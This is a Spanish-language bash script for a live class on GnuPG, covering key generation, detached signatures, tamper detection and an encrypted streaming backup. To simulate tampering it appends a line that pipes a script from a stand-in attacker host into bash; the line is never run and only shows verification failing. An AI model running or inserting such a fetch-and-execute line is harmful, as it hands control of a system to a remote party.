#!/usr/bin/env bash
# ==============================================================================
# DEMOSTRACIÓN INTERACTIVA: Criptografía Asimétrica con GnuPG (GPG)
# Repositorios de Paquetes, Firmas Digitales y Backups Asimétricos
# Basado en: linux/administrator/gpg/gpg_firmas_repositorios_backups.md
#
# Diseñado para clases en vivo:
#  - Muestra SIEMPRE el comando exacto ejecutado ($ comando).
#  - Muestra la salida real del sistema destacada en una caja limpia.
#  - Desglosa y explica la arquitectura de claves primarias y subclaves [SC] y [E].
#  - Demostración de firmas desasociadas y detección de manipulación (tampering).
#  - Pipeline de backup asimétrico real en streaming (tar | gzip | gpg).
#  - Preguntas disparadoras ("pie de clase") para interactuar con los alumnos.
#
# Uso:
#   ./demo_gpg.sh          -> Modo interactivo (pausa con [ENTER])
#   ./demo_gpg.sh --auto 2 -> Modo automático (espera 2s entre pasos)
# ==============================================================================

set -uo pipefail

AUTO_WAIT=0
KEEP_TEMP=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --auto)
            AUTO_WAIT="${2:-2}"
            shift 2
            ;;
        --keep)
            KEEP_TEMP=1
            shift
            ;;
        *)
            shift
            ;;
    esac
done

# Colores ANSI
C_RESET="\033[0m"
C_BOLD="\033[1m"
C_DIM="\033[2m"
C_GREEN="\033[0;32m"
C_CYAN="\033[0;36m"
C_YELLOW="\033[1;33m"
C_MAGENTA="\033[1;35m"
C_RED="\033[0;31m"
C_BLUE="\033[1;34m"

# Directorio de trabajo aislado para no modificar ~/.gnupg del usuario
WORK_DIR="/tmp/demo_gpg_$$"
export GNUPGHOME="${WORK_DIR}/gnupg_home"

cleanup() {
    if [ "$KEEP_TEMP" -eq 1 ]; then
        echo -e "\n${C_YELLOW}ℹ [INFO] Preservando directorio temporal en: ${WORK_DIR}${C_RESET}\n"
        return
    fi
    echo -e "\n${C_YELLOW}🧹 [LIMPIEZA] Eliminando archivos temporales y llaveros de prueba...${C_RESET}"
    if [ -d "$WORK_DIR" ]; then
        # Matar el gpg-agent del entorno aislado si sigue vivo
        gpgconf --homedir "$GNUPGHOME" --kill gpg-agent 2>/dev/null || true
        rm -rf "$WORK_DIR" 2>/dev/null || true
    fi
    echo -e "${C_GREEN}✔ Entorno temporal limpio.${C_RESET}\n"
}
trap cleanup EXIT INT TERM

# Configuración amigable para TMUX
if [ -n "${TMUX:-}" ]; then
    tmux set -g mouse on 2>/dev/null || true
fi

step_banner() {
    local num="$1"
    local title="$2"
    echo -e "\n${C_MAGENTA}╔════════════════════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_MAGENTA}║${C_RESET} ${C_BOLD}${C_YELLOW}PASO ${num}: ${title}${C_RESET}"
    echo -e "${C_MAGENTA}╚════════════════════════════════════════════════════════════════════════════════════╝${C_RESET}"
}

explain() {
    echo -e "${C_CYAN}💡 EXPLICACIÓN TEÓRICA:${C_RESET} $1"
}

pie_clase() {
    local pregunta="$1"
    local respuesta="${2:-}"
    
    echo -e "\n${C_BOLD}${C_YELLOW}❓ Pregunta: ${pregunta}${C_RESET}"
    if [ -n "$respuesta" ]; then
        if [ "$AUTO_WAIT" -gt 0 ]; then
            sleep 1
        else
            echo -en "${C_DIM}   [Presioná ENTER para ver la respuesta...]${C_RESET} "
            read -r </dev/tty 2>/dev/null || read -
        fi
        echo -e "   ${C_BOLD}${C_CYAN}✔ Respuesta esperada:${C_RESET} ${respuesta}\n"
    fi
}

pause_step() {
    local msg="${1:-Presioná [ENTER] para continuar...}"
    if [ "$AUTO_WAIT" -gt 0 ]; then
        echo -e "\n${C_YELLOW}⏳ Esperando ${AUTO_WAIT}s (modo auto)...${C_RESET}"
        sleep "$AUTO_WAIT"
    else
        echo -e "\n${C_BOLD}${C_GREEN}▶ ${msg}${C_RESET}"
        read -r </dev/tty 2>/dev/null || read -
    fi
}

run_and_show() {
    local cmd="$1"
    echo -e "\n${C_BOLD}${C_BLUE}┌─── COMANDO A EJECUTAR ────────────────────────────────────────────────────────────┐${C_RESET}"
    echo -e "${C_BOLD}${C_GREEN}$ ${cmd}${C_RESET}"
    echo -e "${C_BOLD}${C_BLUE}├─── SALIDA REAL DEL SISTEMA ───────────────────────────────────────────────────────┤${C_RESET}"
    
    local output
    output=$(eval "$cmd" 2>&1) || true
    
    if [ -z "$output" ]; then
        echo -e "${C_YELLOW}(El comando finalizó exitosamente sin imprimir texto en stdout/stderr)${C_RESET}"
    else
        echo -e "${output}"
    fi
    echo -e "${C_BOLD}${C_BLUE}└───────────────────────────────────────────────────────────────────────────────────┘${C_RESET}"
}

if command -v clear &>/dev/null && [ "$AUTO_WAIT" -eq 0 ]; then
    clear
fi

echo -e "${C_BOLD}${C_GREEN}===============================================================================${C_RESET}"
echo -e "${C_BOLD}${C_GREEN} 🔐 LABORATORIO EN VIVO: CRIPTOGRAFÍA ASIMÉTRICA CON GNUPG (GPG)               ${C_RESET}"
echo -e "${C_BOLD}${C_GREEN}===============================================================================${C_RESET}"
echo -e "Generación de Par de Claves ➔ Firmas Desasociadas ➔ Detección de Tampering"
echo -e "➔ Pipeline de Backup Asimétrico en Streaming ➔ Formato Binario APT Keyrings\n"

# ------------------------------------------------------------------------------
# 0. Verificaciones previas y preparación de entorno
# ------------------------------------------------------------------------------
step_banner "0" "Preparación del Entorno Aislado"

explain "Comprobando que la herramienta 'gpg' esté instalada en el sistema:"
if ! command -v gpg &>/dev/null; then
    echo -e "${C_YELLOW}GPG no encontrado. Instalando paquete...${C_RESET}"
    if command -v dnf &>/dev/null; then
        sudo dnf install -y gnupg2
    elif command -v apt-get &>/dev/null; then
        sudo apt-get update -qq && sudo apt-get install -y -qq gnupg
    fi
fi
echo -e "${C_GREEN}✔ Binario gpg disponible: $(gpg --version | head -n 1)${C_RESET}"

explain "Aislamos el llavero para no alterar las claves reales de tu usuario (~/.gnupg):"
mkdir -p "$GNUPGHOME"
chmod 700 "$GNUPGHOME"
echo -e "Directorio seguro aislado: ${C_BOLD}${GNUPGHOME}${C_RESET}"

pause_step "Presioná [ENTER] para generar el par de claves mediante un lote no interactivo (batch)..."

# ------------------------------------------------------------------------------
# 1. Generación de Par de Claves Asimétricas (Batch)
# ------------------------------------------------------------------------------
step_banner "1" "Generación Desatendida de Claves (Batch Mode)"

explain "En entornos de CI/CD, servidores y scripts, las claves se crean sin diálogos interactivos."
explain "Generamos una clave primaria Ed25519 para Firma [SC] y una subclave Cv25519 para Cifrado [E]:"

cat << 'EOF' > "${WORK_DIR}/key-spec.conf"
%no-protection
Key-Type: EDDSA
Key-Curve: ed25519
Key-Usage: sign
Subkey-Type: ECDH
Subkey-Curve: cv25519
Subkey-Usage: encrypt
Name-Real: SysAdmin Produccion
Name-Email: sysadmin@empresa.com
Expire-Date: 0
%commit
EOF

run_and_show "gpg --batch --generate-key ${WORK_DIR}/key-spec.conf"

pause_step "Presioná [ENTER] para inspeccionar la arquitectura del llavero..."

# ------------------------------------------------------------------------------
# 2. Inspección del Llavero y Huella Digital (Fingerprint)
# ------------------------------------------------------------------------------
step_banner "2" "Inspección de Claves Primarias y Subclaves"

explain "Listamos las claves públicas almacenadas en el nuevo llavero:"
run_and_show "gpg --list-keys --keyid-format LONG sysadmin@empresa.com"

explain "Obtenemos la huella digital criptográfica (fingerprint) de 40 dígitos hexadecimales:"
run_and_show "gpg --fingerprint sysadmin@empresa.com"

echo -e "\n${C_CYAN}🔍 ANÁLISIS DE LA SALIDA:${C_RESET}"
echo -e " • ${C_BOLD}pub ed25519 ... [SC]${C_RESET} -> Clave primaria con capacidad de Firmar (Sign) y Certificar (Certify)."
echo -e " • ${C_BOLD}sub cv25519 ... [E]${C_RESET}  -> Subclave derivada con capacidad exclusiva de Cifrar (Encrypt)."

pie_clase "¿Por qué se utiliza una subclave para cifrar en lugar de la clave primaria?" \
          "Para aislar riesgos: si la subclave de cifrado se compromete, se revoca sin destruir la identidad ni las firmas anteriores."

pause_step "Presioná [ENTER] para exportar la clave pública a formato legible ASCII Armor..."

# ------------------------------------------------------------------------------
# 3. Exportación de Clave Pública (ASCII Armor)
# ------------------------------------------------------------------------------
step_banner "3" "Exportación de Clave Pública (--armor --export)"

explain "Exportamos la clave pública en formato texto plano ASCII Armor (.asc) para compartirla libremente:"
run_and_show "gpg --armor --export sysadmin@empresa.com > ${WORK_DIR}/sysadmin_pub.asc"
run_and_show "head -n 10 ${WORK_DIR}/sysadmin_pub.asc"

explain "Comprobamos que la clave privada sigue segura en el llavero local:"
run_and_show "gpg --list-secret-keys --keyid-format LONG"

pause_step "Presioná [ENTER] para crear una firma digital desasociada (detached signature)..."

# ------------------------------------------------------------------------------
# 4. Firma Digital Desasociada y Verificación
# ------------------------------------------------------------------------------
step_banner "4" "Firma Digital Desasociada (Detached Signature)"

explain "Creamos un archivo crítico que simula un paquete de software o script de despliegue:"
cat << 'EOF' > "${WORK_DIR}/deploy-app.sh"
#!/usr/bin/env bash
echo "Iniciando despliegue de produccion v2.4.0..."
exit 0
EOF

explain "Generamos una firma desasociada (--detach-sign). Deja el script intacto y crea un archivo .asc:"
run_and_show "gpg --armor --detach-sign ${WORK_DIR}/deploy-app.sh"

explain "Verificamos los archivos resultantes:"
run_and_show "ls -lh ${WORK_DIR}/deploy-app.sh*"

explain "Verificamos la autenticidad e integridad del script con gpg --verify:"
run_and_show "gpg --verify ${WORK_DIR}/deploy-app.sh.asc ${WORK_DIR}/deploy-app.sh"

pause_step "Presioná [ENTER] para simular un ataque de manipulación (Tampering) y ver qué pasa..."

# ------------------------------------------------------------------------------
# 5. Detección Forense de Manipulación (Tampering)
# ------------------------------------------------------------------------------
step_banner "5" "Prueba Forense: Detección de Ataque Malicioso"

explain "Simulamos que un atacante interceptó el paquete y agregó un comando malicioso en el script:"
echo "curl -s http://hacker.evil/exfiltrate.sh | bash" >> "${WORK_DIR}/deploy-app.sh"

explain "El script ahora tiene una sola línea extra no autorizada. Verificamos nuevamente la firma:"
run_and_show "gpg --verify ${WORK_DIR}/deploy-app.sh.asc ${WORK_DIR}/deploy-app.sh"

echo -e "\n${C_BOLD}${C_RED}🚨 ALERTA CRIPTOGRÁFICA DETECTADA:${C_RESET}"
echo -e "GPG detectó inmediatamente: ${C_BOLD}BAD signature${C_RESET}."
echo -e "Cualquier alteración en un solo bit del archivo invalida por completo la firma matemática."

pie_clase "¿Qué propiedad de la seguridad informática garantiza esta verificación?" \
          "La Integridad de los datos y el No Repudio de la fuente (Autenticidad)."

pause_step "Presioná [ENTER] para ejecutar el pipeline de backup asimétrico en streaming..."

# ------------------------------------------------------------------------------
# 6. Pipeline de Backup Asimétrico en Producción
# ------------------------------------------------------------------------------
step_banner "6" "Pipeline de Backup Asimétrico en Producción (Streaming)"

explain "Escenario Real: Un servidor web comprime y cifra respaldos sin escribir texto plano a disco."
explain "El servidor utiliza la clave pública de 'sysadmin@empresa.com' para cifrar al vuelo:"

mkdir -p "${WORK_DIR}/sitio_web"
echo "index.html v1" > "${WORK_DIR}/sitio_web/index.html"
echo "config.php con contraseñas de BD" > "${WORK_DIR}/sitio_web/config.php"

explain "Ejecutamos el pipeline: tar | gzip | gpg --encrypt directo a disco:"
run_and_show "tar -czf - -C '${WORK_DIR}' sitio_web | gpg --batch --yes --trust-model always --encrypt --recipient sysadmin@empresa.com > '${WORK_DIR}/backup_web.tar.gz.gpg'"

run_and_show "ls -lh '${WORK_DIR}/backup_web.tar.gz.gpg'"

pie_clase "Si un atacante roba el archivo backup_web.tar.gz.gpg y vulnera el servidor web, ¿puede leer los datos?" \
          "¡No! El servidor web solo posee la clave pública. Para descifrar se necesita la clave privada que reside fuera del servidor."

pause_step "Presioná [ENTER] para descifrar el backup en la estación de auditoría..."

# ------------------------------------------------------------------------------
# 7. Descifrado y Restauración del Backup
# ------------------------------------------------------------------------------
step_banner "7" "Restauración y Descifrado Seguro"

explain "En la estación de administración (donde reside la clave privada), desciframos el backup en streaming:"
mkdir -p "${WORK_DIR}/restaurado"
run_and_show "gpg --decrypt '${WORK_DIR}/backup_web.tar.gz.gpg' | tar -xzf - -C '${WORK_DIR}/restaurado'"

explain "Comprobamos que los archivos restaurados están 100% íntegros:"
run_and_show "ls -la '${WORK_DIR}/restaurado/sitio_web/'"
run_and_show "cat '${WORK_DIR}/restaurado/sitio_web/config.php'"

pause_step "Presioná [ENTER] para ver cómo se prepara una clave para APT Keyrings modernos..."

# ------------------------------------------------------------------------------
# 8. Conversión a Formato Binario para APT (/etc/apt/keyrings)
# ------------------------------------------------------------------------------
step_banner "8" "Conversión Binaria para APT Keyrings (gpg --dearmor)"

explain "Debian y Ubuntu modernos exigen guardar las claves de repositorios en formato binario (.gpg) en /etc/apt/keyrings/:"
run_and_show "gpg --dearmor < '${WORK_DIR}/sysadmin_pub.asc' > '${WORK_DIR}/sysadmin_archive.gpg'"

explain "Comprobamos que el archivo resultante es un llavero binario OpenPGP válido:"
run_and_show "file '${WORK_DIR}/sysadmin_archive.gpg'"

step_banner "FIN" "Demostración de GPG y Criptografía Asimétrica Finalizada"
echo -e "${C_BOLD}${C_GREEN}✔ Se demostró el ciclo de vida asimétrico: generación, firmas, integridad y backups de producción.${C_RESET}\n"
